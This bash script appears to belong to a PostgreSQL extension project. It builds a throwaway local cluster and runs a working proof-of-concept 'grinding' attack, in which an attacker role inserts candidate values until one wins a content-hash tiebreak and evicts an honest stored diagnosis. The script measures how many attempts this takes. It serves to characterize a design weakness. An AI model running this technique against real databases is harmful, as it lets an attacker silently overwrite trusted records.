#!/usr/bin/env bash
#
# scripts/hash_grind.sh — F7 characterization of the content-hash tiebreak
# grinding attack.
#
# F6 breaks a true (kind, specificity, confidence) precedence tie by
# hash_bytes over (entity_id, attribute, value, valid_lower, valid_upper)
# with lower-hash-wins semantics (src/epistemic_am.c:489-518, calling
# common/hashfn.h:23 REL_18_STABLE). The attacker controls `value`.
# The AM's precedence code is deterministic per build; an attacker who
# can (a) observe the incumbent's row via SELECT and (b) INSERT new rows
# can grind `value` bytes until it beats the incumbent's hash.
#
# This script does NOT patch anything. It:
#   1. Confirms the README ATTACKER MODEL (roles with INSERT + ALTER TABLE
#      also have SELECT on the same relation) trivially observes the
#      incumbent's (kind, specificity, confidence).
#   2. Installs a plain incumbent INFERRED row.
#   3. Iterates candidate values (attack_v0, attack_v1, ...) and for each
#      candidate, in a fresh transaction: attempts the INSERT with matched
#      (kind, spec, conf). If the AM raises "NEW_LOSES" the attacker
#      lost this attempt; if the INSERT commits (and evicts the incumbent
#      to epistemic.evicted_fact) the attacker won.
#      Reports #attempts to first success.
#   4. Verifies the attacker's row survives and the honest one is
#      evicted (present in epistemic.evicted_fact).
#   5. Repeats with the alternative grinding pattern of variable-length
#      whitespace suffixes ("evil", "evil ", "evil  ", ...).
#
# Bash 3.2 compatible.

set -euo pipefail

REPO="${REPO:-$(cd "$(dirname "$0")/.." && pwd)}"
PGBIN="${PGBIN:-/opt/homebrew/opt/postgresql@18/bin}"
PORT="${PORT:-55502}"
DATADIR="${DATADIR:-/tmp/kndb_f7_grind_$$}"
LOG="${DATADIR}/server.log"
SOCKDIR="${DATADIR}"

INITDB="${PGBIN}/initdb"
PG_CTL="${PGBIN}/pg_ctl"
PSQL="${PGBIN}/psql"
PG_ISREADY="${PGBIN}/pg_isready"

PSQL_CONN="-h ${SOCKDIR} -p ${PORT} -d postgres"

log()  { printf '[hash_grind] %s\n' "$*"; }
fail() { printf '[hash_grind] FAIL: %s\n' "$*" >&2; exit 1; }

cleanup() {
    if [ -d "${DATADIR}" ]; then
        "${PG_CTL}" -D "${DATADIR}" -m immediate stop >/dev/null 2>&1 || true
        [ "${KEEP:-0}" = "1" ] || rm -rf "${DATADIR}"
    fi
}
trap cleanup EXIT

log "spinning cluster at ${DATADIR}"
rm -rf "${DATADIR}"
mkdir -p "${DATADIR}"
chmod 700 "${DATADIR}"
"${INITDB}" -D "${DATADIR}" -U "$(whoami)" --auth=trust --no-locale \
    --encoding=UTF8 >/dev/null
cat >> "${DATADIR}/postgresql.conf" <<CONF
port = ${PORT}
listen_addresses = ''
unix_socket_directories = '${SOCKDIR}'
shared_preload_libraries = 'epistemic'
log_min_messages = warning
log_line_prefix = '%m [%p] '
CONF
"${PG_CTL}" -D "${DATADIR}" -l "${LOG}" -w -t 30 start >/dev/null \
    || fail "postmaster failed to start"
for i in 1 2 3 4 5 6 7 8 9 10; do
    "${PG_ISREADY}" -h "${SOCKDIR}" -p "${PORT}" -q && break
    sleep 1
    [ "${i}" = "10" ] && fail "pg_isready never returned success"
done

log "installing extension, fact table, incumbent row"
"${PSQL}" ${PSQL_CONN} -v ON_ERROR_STOP=1 -q <<'SQL' >/dev/null
CREATE EXTENSION IF NOT EXISTS epistemic;

INSERT INTO epistemic.source_registry (source_id, source_type)
VALUES ('honest_llm', 'llm'), ('adversary_llm', 'llm');

CREATE TABLE fact (
    entity_id      int NOT NULL,
    attribute      text NOT NULL,
    value          text,
    sources        text[],
    valid_time     tstzrange,
    sys_time       tstzrange DEFAULT tstzrange(now(), 'infinity'),
    ep_kind        epistemic.epistemic_kind NOT NULL,
    ep_specificity int2 NOT NULL DEFAULT 0,
    ep_confidence  real NOT NULL DEFAULT 1.0
) USING epistemic;

-- Incumbent: honest INFERRED row.
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', 'honest_report', ARRAY['honest_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
SQL

# -------- Step 1: observability from a non-privileged role --------
log ""
log "=== Step 1: attacker observability of (kind, specificity, confidence) ==="
"${PSQL}" ${PSQL_CONN} -v ON_ERROR_STOP=1 -q <<'SQL' >/dev/null
CREATE ROLE attacker LOGIN;
GRANT USAGE ON SCHEMA epistemic TO attacker;
GRANT SELECT, INSERT ON fact TO attacker;
-- The README ATTACKER MODEL grants INSERT + ALTER TABLE. ALTER TABLE
-- privilege on the target is the DDL for the bypass claim, not a
-- runtime lock; we only need SELECT+INSERT for the grinding attack.
GRANT SELECT ON epistemic.source_registry TO attacker;
GRANT SELECT ON epistemic.slot_kind TO attacker;
-- The audit insert on eviction runs under the caller's role too; needs
-- INSERT on epistemic.evicted_fact when a race lands.
GRANT INSERT ON epistemic.evicted_fact TO attacker;
GRANT USAGE, SELECT ON SEQUENCE epistemic.evicted_fact_audit_id_seq TO attacker;
SQL
log "  attacker role: LOGIN + SELECT + INSERT on fact"
log "  reading incumbent as attacker:"
"${PSQL}" ${PSQL_CONN} -U attacker -Atq <<'SQL' 2>&1 | sed 's/^/[hash_grind]     /'
SELECT entity_id, attribute, value, ep_kind::text, ep_specificity, ep_confidence
  FROM fact WHERE entity_id=42 AND attribute='diagnosis';
SQL

# -------- Step 2: brute-force grind --------
log ""
log "=== Step 2: grinding attack (numeric suffix on 'attack_v') ==="
log "  target incumbent: (kind=INFERRED, spec=50, conf=0.8, value='honest_report')"
log "  attacker candidates: attack_v0, attack_v1, ..."
log ""

ATTEMPTS=0
WINNER=""
MAX_ATTEMPTS="${MAX_ATTEMPTS:-1000}"

for i in $(seq 0 "${MAX_ATTEMPTS}"); do
    ATTEMPTS=$((ATTEMPTS + 1))
    VAL="attack_v${i}"
    # Attempt: matched (kind, spec, conf); adversarial value.
    out=$("${PSQL}" ${PSQL_CONN} -U attacker -v ON_ERROR_STOP=0 -X -Atq 2>&1 <<SQL
BEGIN;
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', '${VAL}', ARRAY['adversary_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
COMMIT;
SQL
)
    if printf '%s\n' "${out}" | grep -q "NEW_LOSES"; then
        # incumbent kept its throne; try next candidate.
        continue
    fi
    if printf '%s\n' "${out}" | grep -qE 'ERROR|FATAL'; then
        log "  attempt ${ATTEMPTS} (value=${VAL}) unexpected error:"
        printf '%s\n' "${out}" | sed 's/^/[hash_grind]     /'
        break
    fi
    # Success on this candidate.
    WINNER="${VAL}"
    break
done

log ""
log "  first winning candidate: ${WINNER}"
log "  attempts required: ${ATTEMPTS}"
log ""
log "  post-attack state of fact:"
"${PSQL}" ${PSQL_CONN} -Atq <<'SQL' | sed 's/^/[hash_grind]     /'
SELECT value, ep_specificity, ep_confidence, upper(sys_time)::text AS sys_upper
  FROM fact WHERE entity_id=42 AND attribute='diagnosis' ORDER BY sys_time;
SQL
log ""
log "  epistemic.evicted_fact rows:"
"${PSQL}" ${PSQL_CONN} -Atq <<'SQL' | sed 's/^/[hash_grind]     /'
SELECT reason, original_kind, original_row->>'value' AS orig_value,
       (original_row->>'ep_specificity')::int AS orig_spec,
       (original_row->>'ep_confidence')::float AS orig_conf
  FROM epistemic.evicted_fact ORDER BY audit_id;
SQL

# -------- Step 3: repeat with whitespace-suffix grinding ------------
log ""
log "=== Step 3: repeat with whitespace-suffix pattern ==="
log "  reset table, reinstall honest incumbent, grind on 'evil'||repeat(' ',n)"
"${PSQL}" ${PSQL_CONN} -v ON_ERROR_STOP=1 -q <<'SQL' >/dev/null
TRUNCATE fact;
TRUNCATE epistemic.evicted_fact;
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', 'honest_report', ARRAY['honest_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
SQL

ATTEMPTS2=0
WINNER2=""
for i in $(seq 0 "${MAX_ATTEMPTS}"); do
    ATTEMPTS2=$((ATTEMPTS2 + 1))
    # append i spaces
    PAD=$(printf ' %.0s' $(seq 1 "${i}") 2>/dev/null || true)
    VAL="evil${PAD}"
    out=$("${PSQL}" ${PSQL_CONN} -U attacker -v ON_ERROR_STOP=0 -X -Atq 2>&1 <<SQL
BEGIN;
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', '${VAL}', ARRAY['adversary_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
COMMIT;
SQL
)
    if printf '%s\n' "${out}" | grep -q "NEW_LOSES"; then
        continue
    fi
    if printf '%s\n' "${out}" | grep -qE 'ERROR|FATAL'; then
        log "  attempt ${ATTEMPTS2} unexpected error:"
        printf '%s\n' "${out}" | sed 's/^/[hash_grind]     /'
        break
    fi
    WINNER2="[evil + ${i} spaces]"
    break
done

log "  first winning candidate: ${WINNER2}"
log "  attempts required: ${ATTEMPTS2}"
log ""
log "  post-attack state:"
"${PSQL}" ${PSQL_CONN} -Atq <<'SQL' | sed 's/^/[hash_grind]     /'
SELECT length(value) AS vlen, ep_specificity, ep_confidence, upper(sys_time)::text
  FROM fact WHERE entity_id=42 AND attribute='diagnosis' ORDER BY sys_time;
SQL

# -------- Step 4: 100 fresh trials, count attempts distribution -----
log ""
log "=== Step 4: distribution of attempts across 100 fresh incumbents ==="
log "  each trial: fresh incumbent value (honest_v0..99), attacker grinds 'a0..'"
TRIALS="${TRIALS:-100}"
TOTAL_ATT=0
MAX_ATT=0
MIN_ATT=999999
FAILED=0

for T in $(seq 1 "${TRIALS}"); do
    "${PSQL}" ${PSQL_CONN} -v ON_ERROR_STOP=1 -q -c "TRUNCATE fact; TRUNCATE epistemic.evicted_fact;" >/dev/null
    "${PSQL}" ${PSQL_CONN} -v ON_ERROR_STOP=1 -q <<SQL >/dev/null
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', 'honest_${T}', ARRAY['honest_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
SQL
    A=0
    W=""
    for i in $(seq 0 200); do
        A=$((A + 1))
        VAL="a${T}_${i}"
        out=$("${PSQL}" ${PSQL_CONN} -U attacker -v ON_ERROR_STOP=0 -X -Atq 2>&1 <<SQL
BEGIN;
INSERT INTO fact (entity_id, attribute, value, sources, valid_time,
                  ep_kind, ep_specificity, ep_confidence)
VALUES (42, 'diagnosis', '${VAL}', ARRAY['adversary_llm']::text[],
        tstzrange('2026-01-01', 'infinity'),
        'INFERRED'::epistemic.epistemic_kind, 50::int2, 0.8::real);
COMMIT;
SQL
)
        if printf '%s\n' "${out}" | grep -q "NEW_LOSES"; then
            continue
        fi
        if printf '%s\n' "${out}" | grep -qE 'ERROR|FATAL'; then
            W="__error__"
            break
        fi
        W="${VAL}"
        break
    done
    if [ -z "${W}" ] || [ "${W}" = "__error__" ]; then
        FAILED=$((FAILED + 1))
        continue
    fi
    TOTAL_ATT=$((TOTAL_ATT + A))
    if [ "${A}" -gt "${MAX_ATT}" ]; then MAX_ATT="${A}"; fi
    if [ "${A}" -lt "${MIN_ATT}" ]; then MIN_ATT="${A}"; fi
    printf '[hash_grind]   trial=%3s attempts=%3s winner=%s\n' "${T}" "${A}" "${W}"
done

log ""
log "  summary over ${TRIALS} trials:"
log "    successful trials : $(( TRIALS - FAILED ))"
log "    failed trials     : ${FAILED}"
if [ $(( TRIALS - FAILED )) -gt 0 ]; then
    AVG=$(awk "BEGIN{printf \"%.2f\", ${TOTAL_ATT}/(${TRIALS}-${FAILED})}")
    log "    mean attempts     : ${AVG}"
    log "    min / max attempts: ${MIN_ATT} / ${MAX_ATT}"
fi

log "done"
